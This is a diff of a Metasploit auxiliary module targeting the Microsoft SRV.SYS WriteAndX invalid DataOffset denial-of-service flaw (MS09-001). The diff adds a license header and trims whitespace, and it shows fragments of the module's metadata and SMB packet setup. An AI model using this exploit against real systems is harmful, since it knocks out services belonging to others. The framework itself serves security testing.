@@ -1,10 +1,21 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
 class Metasploit3 < Msf::Auxiliary
 
     include Msf::Exploit::Remote::SMB
     include Msf::Auxiliary::Dos
 
     def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Microsoft SRV.SYS WriteAndX Invalid DataOffset',
 			'Description'    => %q{
 				This module exploits a denial of service vulnerability in the
@@ -14,7 +25,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Author'         => [ 'j.v.vallejo[at]gmail.com' ],
 			'License'        => MSF_LICENSE,
 			'Version'        => '$Revision$',
-        	'References' => 
+        	'References' =>
 				[
 					['MSB', 'MS09-001'],
 					['OSVDB', '48153'],
@@ -49,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
 		pkt['Payload'].v['AccessMask'] = 0x2019f  # Maximum Allowed
 		pkt['Payload'].v['ShareAccess'] = 7
 		pkt['Payload'].v['CreateOptions'] = 0x400040
-		pkt['Payload'].v['Impersonation'] = 2       
+		pkt['Payload'].v['Impersonation'] = 2
 		pkt['Payload'].v['Disposition'] = 1
 		pkt['Payload'].v['Payload'] = "\x00\\\x00L\x00S\x00A\x00R\x00P\x00C" + "\x00\x00"
 
